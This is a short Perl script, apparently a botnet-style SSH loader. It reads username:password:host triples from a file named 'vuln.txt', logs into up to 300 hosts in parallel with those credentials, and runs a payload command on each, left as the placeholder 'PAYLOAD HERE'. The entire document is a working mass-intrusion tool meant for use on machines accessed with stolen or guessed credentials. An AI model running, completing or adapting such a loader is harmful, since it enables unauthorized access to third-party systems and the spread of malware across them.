use Net::SSH2; use Parallel::ForkManager;

open(fh,'<','vuln.txt'); @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);
}

my $pm = new Parallel::ForkManager(300); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('PAYLOAD HERE');# Replace with your payload
                        sleep 10;
                        $channel->close;
                        print "\x1b[1;33m[\x1b[31mSSH\x1b[1;33m] \x1b[31mCommanding \x1b[1;33m->  \x1b[31m".$newarray[$c]."";
                } else {
                        print "\x1b[90mCan't Authenticate Host $newarray[$c]";
                }
        } else {
                print "\x1b[90mCant Connect To Host $newarray[$c]";
        }
        $pm->finish;
}
$pm->wait_all_children;
